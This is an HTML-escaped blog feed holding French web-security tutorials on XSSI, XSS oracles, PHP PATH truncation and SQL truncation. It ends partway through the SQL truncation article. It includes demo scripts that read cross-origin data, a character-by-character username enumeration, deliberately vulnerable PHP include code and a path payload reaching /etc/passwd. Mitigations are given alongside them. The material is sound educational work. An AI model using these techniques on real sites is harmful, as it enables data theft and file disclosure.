+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://externe.dtd/image.png&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La balise &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;D'autres exemples de balises telles que les balises &lt;em&gt;link&lt;/em&gt; ou &lt;em&gt;video&lt;/em&gt; sont disponibles dans la &lt;a href="https://developer.mozilla.org/fr/docs/Web/JavaScript/Same_origin_policy_for_JavaScript"&gt;documentation de Firefox&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Ce mécanisme permissif permet d'envisager un scénario dans lequel la SOP ne fonctionne pas : l'utilisation de &lt;strong&gt;XSSI&lt;/strong&gt; !&lt;/p&gt;
+&lt;h2&gt;Les XSSI&lt;/h2&gt;
+&lt;p&gt;Alors, une XSSI, c'est quoi ?&lt;/p&gt;
+&lt;p&gt;Une XSSI, abréviation de &lt;strong&gt;Cross Site Script Inclusion&lt;/strong&gt;, est le fait d'inclure une page distante ayant un contenu en Javascript.&lt;/p&gt;
+&lt;p&gt;En effet, la balise &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; inclut, via son attribut &lt;em&gt;src&lt;/em&gt;, une page externe qui est chargée comme étant du Javascript.&lt;/p&gt;
+&lt;p&gt;Prenons l'exemple de script PHP disponible &lt;a href="https://www.dailysecurity.fr/labs/info.php"&gt;ici&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Dans notre exemple, on suppose que la fonction &lt;code&gt;get_user_info()&lt;/code&gt; récupère les informations dans une base de données grâce au cookie utilisateur :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;span class="c1"&gt;// Charge la session utilisateur&lt;/span&gt;
+&lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;get_user_info&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="c1"&gt;// TODO : Récupérer les informations de l&amp;#39;utilisateur courant dans la base de données&lt;/span&gt;
+    &lt;span class="c1"&gt;// Dans notre exemple, les informations seront hardcodées&lt;/span&gt;
+    &lt;span class="nv"&gt;$info&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{&amp;#39;user&amp;#39; : &amp;#39;Geluchat&amp;#39;, &amp;#39;API_KEY&amp;#39; : &amp;#39;l3x11sG00dBuT3l54J34n1sB3tt3r&amp;#39;}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$info&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type: application/javascript&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nv"&gt;$build_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;var info = [&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nx"&gt;get_user_info&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;];&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$build_response&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On remarque que le script PHP change le Content-type de la page. On peut supposer que pour des raisons pratiques les informations sont chargées dynamiquement sur le site via du Javascript.&lt;/p&gt;
+&lt;p&gt;En revanche, ce type d'utilisation n'est pas du tout sécurisé comme le montre le script suivant : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://www.dailysecurity.fr/labs/info.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stringify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;info&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Vous pouvez faire le test chez vous depuis un fichier local ou sur un serveur distant, les informations de l'utilisateur sont affichées (en tenant compte de son cookie) : &lt;/p&gt;
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/info_xssi.png" alt="Info XSSI" style="width: 50%;"&gt;&lt;/p&gt;
+&lt;p&gt;Un attaquant peut alors mettre en place le système suivant : &lt;/p&gt;
+&lt;p&gt;&lt;img alt="Schéma XSSI Final" src="https://www.dailysecurity.fr/images/schema_xssi_2.png"&gt;&lt;/p&gt;
+&lt;p&gt;Il existe des moyens permettant de charger d'autres types de fichiers (CSV, JSON) en jouant avec le charset des éléments HTML comme le montre ce &lt;a href="https://www.mbsd.jp/Whitepaper/xssi.pdf"&gt;document&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;Néanmoins, la plupart des contournements présentés ne fonctionnent plus sur les versions récentes des navigateurs.&lt;/p&gt;
+&lt;h2&gt;Les XSS Oracle&lt;/h2&gt;
+&lt;p&gt;Un exemple plus poussé des XSSI est présenté dans &lt;a href="https://www.hurricanelabs.com/blog/new-xssi-vector-untold-merits-of-nosniff"&gt;l'article de Hurricane Labs&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Cet article détaille une méthode jusqu'ici méconnue utilisant à la fois les XSSI et les codes de retour HTTP.&lt;/p&gt;
+&lt;p&gt;Admettons qu'une page d'un site retourne différents codes HTTP (200, 404, 302, etc...) en réponse à différentes requêtes de type GET.&lt;/p&gt;
+&lt;p&gt;Il serait alors possible de récupérer ces codes à l'aide du handler onerror.&lt;/p&gt;
+&lt;p&gt;En effet, en jouant avec ces handlers, il est possible d'extraire des données par le même procédé que lors d'une &lt;em&gt;Blind SQL injection&lt;/em&gt; (c-à-d caractère par caractère) comme montré dans le script suivant : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+function http200()
+{
+    alert(&amp;quot;HTTP 200&amp;quot;)
+}
+function http404()
+{
+    alert(&amp;quot;HTTP 404&amp;quot;)
+}
+&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://www.dailysecurity.fr/labs/httpResponse.php&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;async=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;async&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;onerror=&lt;/span&gt;&lt;span class="s"&gt;http404()&lt;/span&gt; &lt;span class="na"&gt;onload=&lt;/span&gt;&lt;span class="s"&gt;http200()&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;httpResponse.php :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nb"&gt;http_response_code&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;else&lt;/span&gt; 
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nb"&gt;http_response_code&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;404&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On peut donc faire la différence entre deux réponses grâce aux codes HTTP et aux handlers d'erreurs !&lt;/p&gt;
+&lt;p&gt;Le mécanisme ci-dessus, permettant de savoir si une réponse est vraie ou fausse, est appelé &lt;strong&gt;Oracle XSS&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Quelle utilité peut-on trouver à cette méthode ?&lt;/p&gt;
+&lt;p&gt;Si le site distant possède un système de recherche d'utilisateurs uniquement disponible pour l’administrateur, on peut les lister ces utilisateurs en comparant les retours des codes HTTP.&lt;/p&gt;
+&lt;p&gt;Il faudra bien sûr que la personne connectée soit l'administrateur du site.&lt;/p&gt;
+&lt;p&gt;Exemple de scénario d'attaque via un oracle XSS : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /admin/search.php?user=j*  -&amp;gt; 200 // &amp;#39;j&amp;#39; est donc notre premier caractère.
+GET /admin/search.php?user=ja* -&amp;gt; 404 // Aucun utilisateur ne commence par &amp;#39;ja&amp;#39; on teste donc la lettre suivante.
+GET /admin/search.php?user=jb* -&amp;gt; 404
+GET /admin/search.php?user=jc* -&amp;gt; 404
+GET /admin/search.php?user=jd* -&amp;gt; 404
+GET /admin/search.php?user=je* -&amp;gt; 200
+---
+snip
+---
+GET /admin/search.php?user=jean -&amp;gt; 200 // Nous avons récupéré l&amp;#39;utilisateur &amp;#39;jean&amp;#39; ! 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Afin de stopper ce genre d'attaque, on peut utiliser les méthodes suivantes :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;On ajoute le header &lt;code&gt;X-Content-Type-Options: nosniff&lt;/code&gt;, celui-ci protégeant des attaques sur les Content-Type.&lt;/li&gt;
+&lt;li&gt;On évite de mettre des informations utilisateur dans des fichiers Javascript.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="Journal de Geluchat"></category><category term="SOP"></category><category term="XSS"></category><category term="XSSI"></category><category term="Javascript"></category><category term="Failles Web"></category><category term="Tutoriel"></category></entry><entry><title>Les PATH truncations: The old one</title><link href="https://www.dailysecurity.fr/les-path-truncations" rel="alternate"></link><published>2015-02-06T11:35:00+01:00</published><updated>2015-02-06T11:35:00+01:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2015-02-06:/les-path-truncations</id><summary type="html">&lt;p&gt;Après les &lt;a href="https://www.dailysecurity.fr/les-sql-truncations/"&gt;SQL truncations&lt;/a&gt;, passons à l'étude de son homologue PHP, les PATH truncations.&lt;/p&gt;
+&lt;p&gt;Pour comprendre le problème, revenons à la base de la construction du moteur PHP. 
+PHP est basé sur le moteur Zend engine écrit en C, il dispose donc des contraintes mémoires et de la gestion parfois …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Après les &lt;a href="https://www.dailysecurity.fr/les-sql-truncations/"&gt;SQL truncations&lt;/a&gt;, passons à l'étude de son homologue PHP, les PATH truncations.&lt;/p&gt;
+&lt;p&gt;Pour comprendre le problème, revenons à la base de la construction du moteur PHP. 
+PHP est basé sur le moteur Zend engine écrit en C, il dispose donc des contraintes mémoires et de la gestion parfois chaotique de la mémoire liée à ce langage.&lt;/p&gt;
+&lt;p&gt;Il parait donc tout à fait naturel que pour palier à ce problème les créateurs de ce langage aient dû s'orienter vers une gestion simplifiée de la mémoire paradoxalement au PHP qui est lui-même un langage très faiblement typé&lt;/p&gt;
+&lt;p&gt;Passons donc au vif du sujet, les strings PHP, jusqu’à la version 5.3, peuvent supporter une chaîne de longueur maximum égal à 2^12 soit &lt;a href="https://eklitzke.org/path-max-is-tricky"&gt;4096&lt;/a&gt; caractères.&lt;/p&gt;
+&lt;p&gt;Que se passe-t-il si l'on dépasse cette limite?&lt;/p&gt;
+&lt;p&gt;Eh bien, PHP tronque tout simplement la chaîne.
+Comme à l’accoutumé, voici un exemple pour illustrer le principe et mettre en avant le problème:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;preg_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/\x00/im&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+     &lt;span class="k"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ce code comporte une LFI, on peut inclure n’importe quel fichier PHP ou lire le code via les wrappers php.&lt;/p&gt;
+&lt;p&gt;De plus, le null byte étant filtré, on ne peut pas inclure un fichier qui ne comporte pas l'extension .php&lt;/p&gt;
+&lt;p&gt;Comment faire?&lt;/p&gt;
+&lt;p&gt;C'est là qu'intervient la PATH truncation, si l'on envoie une chaîne supérieure à 4096 le .php ne sera pas ajouter à la fin.&lt;/p&gt;
+&lt;p&gt;A ce moment vous êtes sûrement en train de vous poser des questions sur l’intérêt d'une telle faille.
+En effet, comment une chaîne de plus de 4096 pourrait contenir notre chemin qui fait entre 50 et 100 caractères.&lt;/p&gt;
+&lt;p&gt;En fait, la solution est très simple, il suffit d'analyser comment PHP fonctionne.&lt;/p&gt;
+&lt;p&gt;PHP cherche à interpréter une chaîne basique:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Il va tout d'abord chercher le fichier admin.php puis l'inclure, cette procédure, rappelons-le, utilise des fonctions du langage C.&lt;/p&gt;
+&lt;p&gt;Le C possède des conditions d'accès au fichier et de recherche de chemin très poussé et adaptative, il suffit donc de trouver un bypass fonctionnant en C.&lt;/p&gt;
+&lt;p&gt;Après quelques recherches on résout le problème:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/etc/passwd/./././././././././././././[4096 plus tard]/.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Qui est traduit par:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Note: &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;De plus, veillez bien à regarder la taille du chemin, elle doit rester impaire, admin.php fait 9 caractères, mais admin.php3 en fait 10.&lt;/em&gt;
+&lt;em&gt;Cela implique que vous devez équilibrer le nombre de caractères du chemin sinon la troncation ne se fera pas correctement (par exemple: x/../admin.php3)&lt;/em&gt;
+&lt;em&gt;Sous Windows on peut exploiter via les points (admin.php.............[4096]............)&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;On a donc complètement bypass la pseudo vérification d'extension mise en place par le programmeur.&lt;/p&gt;
+&lt;p&gt;Il faut bien sûr retenir de cette faille qu'elle n'est disponible que sur les versions inférieurs à 5.3 .&lt;/p&gt;
+&lt;p&gt;Pour patcher cette faille il suffit donc tout simplement de mettre à jour son PHP par une version supérieure à la 5.3 .&lt;/p&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="Journal de Geluchat"></category><category term="Failles Web"></category><category term="Tutoriel"></category></entry><entry><title>Les SQL truncations : Une faille méconnue, mais très efficace</title><link href="https://www.dailysecurity.fr/les-sql-truncations" rel="alternate"></link><published>2015-01-30T11:35:00+01:00</published><updated>2015-01-30T11:35:00+01:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2015-01-30:/les-sql-truncations</id><summary type="html">&lt;p&gt;Aujourd'hui, j'ai le plaisir de vous présenter le premier article du site, il concernera les SQL truncations. Il est très probable que vous n'en ayez jamais entendu parler car les failles liées à SQL sont noyées par les SQL injections et les bypass en tout genre.&lt;/p&gt;
+&lt;p&gt;Alors, une SQL truncation …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Aujourd'hui, j'ai le plaisir de vous présenter le premier article du site, il concernera les SQL truncations. Il est très probable que vous n'en ayez jamais entendu parler car les failles liées à SQL sont noyées par les SQL injections et les bypass en tout genre.&lt;/p&gt;
+&lt;p&gt;Alors, une SQL truncation, ça ressemble à quoi? Et bien, ça n'est pas très difficile à appréhender.&lt;/p&gt;
+&lt;p&gt;Prenons l'exemple du script SQL suivant:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;TABLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NOT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AUTO_INCREMENT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;VARCHAR&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;CHAR&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;PRIMARY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;KEY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="k"&gt;INSERT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;INTO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;VALUES&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;admin                       x&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mdp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Avec un select de la table, on obtient:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="c1"&gt;---------+------------+&lt;/span&gt;
+&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="c1"&gt;---------+------------+&lt;/span&gt;
+&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;admin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mdp&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="c1"&gt;---------+------------+&lt;/span&gt;
+&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;row&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Le résultat est sans appel, le login a été tronqué par mysql.  &lt;/p&gt;
+&lt;p&gt;Mais pourquoi? Pour les plus observateurs, vous aurez remarqué que le champ login est un varchar de 12 caractères, donc mysql ne réfléchit pas, il enregistre dans l'espace qu'on lui a réservé, d’où la troncation du login.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Remarque : MySQL efface les espaces derrière pour une raison d'optimisation de stockage.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Maintenant, à quoi ça sert?&lt;/p&gt;
+&lt;p&gt;Les exemples d'exploitation de cette faille sont multiples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;En cas d'une mauvaise gestion de l’accès au back office d'un site, comme avec un:&lt;/li&gt;
+&lt;/ul&gt;
